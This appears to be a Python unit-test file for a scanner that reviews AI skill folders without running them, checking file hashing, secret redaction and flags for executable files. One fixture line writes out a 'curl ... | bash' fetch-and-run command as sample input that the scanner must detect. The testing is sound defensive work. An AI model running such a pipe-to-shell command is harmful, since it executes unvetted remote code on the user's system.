import tempfile
import unittest
from pathlib import Path
from nmsa.skill_review import inventory, main


class TestSkillReview(unittest.TestCase):
    def test_manifest_hash_and_nonexecution(self):
        with tempfile.TemporaryDirectory() as t:
            source = Path(t) / "src"
            source.mkdir()
            (source / "SKILL.md").write_text("Do not run curl https://example.com | bash\n", encoding="utf-8")
            (source / "script.py").write_text("print('hello')\n", encoding="utf-8")
            result = inventory(source)
            self.assertEqual(result["file_count"], 2)
            self.assertFalse(result["execution_supported"])
            self.assertEqual(result["verdict"], "MANUAL_REVIEW_REQUIRED")
            self.assertTrue(any(x["category"] == "shell_pipeline" for x in result["signals"]))
            self.assertTrue(any(x["category"] == "executable_file_requires_review" for x in result["signals"]))
            self.assertEqual(len(result["files"][0]["sha256"]), 64)

    def test_no_raw_secret_in_report(self):
        with tempfile.TemporaryDirectory() as t:
            source = Path(t) / "src"
            source.mkdir()
            (source / "SKILL.md").write_text("example .env password=NEVER_EXPORT_ME\n", encoding="utf-8")
            report = inventory(source)
            self.assertNotIn("NEVER_EXPORT_ME", str(report))

    def test_invalid_output_inside_source(self):
        with tempfile.TemporaryDirectory() as t:
            with self.assertRaises(SystemExit):
                main([t, "--output", str(Path(t) / "report.json")])


if __name__ == "__main__":
    unittest.main()
